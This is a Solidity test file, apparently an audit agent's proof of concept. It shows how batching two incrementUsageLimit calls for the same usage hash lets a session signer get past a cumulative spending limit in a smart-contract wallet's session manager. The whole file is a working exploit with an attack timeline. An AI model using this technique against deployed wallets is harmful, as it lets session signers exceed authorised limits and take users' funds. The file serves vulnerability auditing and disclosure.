// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/extensions/sessions/SessionManager.sol";
import "../src/extensions/sessions/explicit/ExplicitSessionManager.sol";
import "../src/extensions/sessions/explicit/Permission.sol";
import "../src/modules/Payload.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");

        // Fix: Set required environment variables for the test base / RPC primitives
        console.log("Setting environment variables...");
        vm.setEnv("SEQ_SDK_RPC_MIN_PORT", "8080");
        vm.setEnv("SEQ_SDK_RPC_MAX_PORT", "8090");
        vm.setEnv("SEQ_SDK_RPC_URL_PREFIX", "http://127.0.0.1:");
        console.log("Environment variables set.");

        // ATTACK TIMELINE:
        // 1. [Setup] Create a session signer with a cumulative permission rule (limit 100).
        // 2. [Setup] Create a Wallet configured with this session signer.
        // 3. [T=0] Attacker crafts a payload with TWO calls to incrementUsageLimit for the SAME usageHash.
        //    Call 1 sets usageAmount = 60. Call 2 sets usageAmount = 80.
        // 4. [T=1] Signature validation (view context) reads storage (0) and validates both calls independently.
        // 5. [T=2] Execution runs Call 1, writing 60 to storage.
        // 6. [T=3] Execution runs Call 2, overwriting storage with 80 (instead of accumulating to 140).
        // 7. [Assert] Verify final storage is 80, proving the TOCTOU overwrite bug (should be 140 or reverted).

        console.log("Before _createDefaultTopology");
        string memory topology = _createDefaultTopology();
        console.log("After _createDefaultTopology");

        console.log("Setting up Permission and SessionPermissions...");
        Permission memory perm = Permission({
            target: address(mockTarget),
            rules: new ParameterRule[](1)
        });
        perm.rules[0] = ParameterRule({
            cumulative: true,
            operation: ParameterOperation.EQUAL,
            value: bytes32(uint256(100)),
            offset: 0,
            mask: bytes32(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
        });

        SessionPermissions memory sessionPerms = SessionPermissions({
            signer: sessionWallet.addr,
            chainId: 0,
            valueLimit: 0,
            deadline: uint64(block.timestamp + 1 days),
            permissions: new Permission[](1)
        });
        sessionPerms.permissions[0] = perm;
        console.log("Permission and SessionPermissions setup complete.");

        console.log("Before _sessionPermissionsToJSON");
        string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
        console.log("After _sessionPermissionsToJSON");

        console.log("Before PrimitivesRPC.sessionExplicitAdd");
        topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
        console.log("After PrimitivesRPC.sessionExplicitAdd");

        console.log("Before _createWallet");
        (Stage1Module Wallet, string memory config,) = _createWallet(topology);
        console.log("After _createWallet, Wallet address:", address(Wallet));

        bytes32 usageHash = keccak256(abi.encode(sessionWallet.addr, perm, uint256(0)));
        console.log("usageHash calculated:", uint256(usageHash));

        UsageLimit[] memory limits1 = new UsageLimit[](1);
        limits1[0] = UsageLimit({ usageHash: usageHash, usageAmount: 60 });

        UsageLimit[] memory limits2 = new UsageLimit[](1);
        limits2[0] = UsageLimit({ usageHash: usageHash, usageAmount: 80 });
        console.log("Usage limits arrays created (60 and 80).");

        console.log("Before _buildPayload");
        Payload.Decoded memory payload = _buildPayload(2);
        console.log("After _buildPayload");

        ExplicitSessionManager explicitMgr = ExplicitSessionManager(address(sessionManager));

        payload.calls[0].to = address(sessionManager);
        payload.calls[0].data = abi.encodeWithSelector(explicitMgr.incrementUsageLimit.selector, limits1);
        payload.calls[0].behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;

        payload.calls[1].to = address(sessionManager);
        payload.calls[1].data = abi.encodeWithSelector(explicitMgr.incrementUsageLimit.selector, limits2);
        payload.calls[1].behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;
        console.log("Payload calls configured with incrementUsageLimit selectors.");

        uint8[] memory permissionIdxs = new uint8[](1);
        permissionIdxs[0] = 0;

        console.log("Before _validExplicitSignature");
        bytes memory signature = _validExplicitSignature(payload, sessionWallet, config, topology, permissionIdxs);
        console.log("After _validExplicitSignature, signature length:", signature.length);

        console.log("Before PrimitivesRPC.toPackedPayload");
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
        console.log("After PrimitivesRPC.toPackedPayload, packedPayload length:", packedPayload.length);

        console.log("Before Wallet.execute, block.timestamp:", block.timestamp);
        vm.recordLogs();
        Wallet.execute(packedPayload, signature);
        console.log("After Wallet.execute");

        uint256 finalUsage = PermissionValidator(address(sessionManager)).getLimitUsage(address(Wallet), usageHash);

        console.log("Final recorded usage:", finalUsage);

        // The bug: Call 2 overwrites Call 1 instead of accumulating. 
        // Expected cumulative usage is 140 (which should revert due to limit 100), 
        // but actual storage is 80.
        assertEq(finalUsage, 80, "TOCTOU: Second call overwrote first call instead of accumulating or reverting");
        console.log("=== Test completed successfully ===");
    }
}
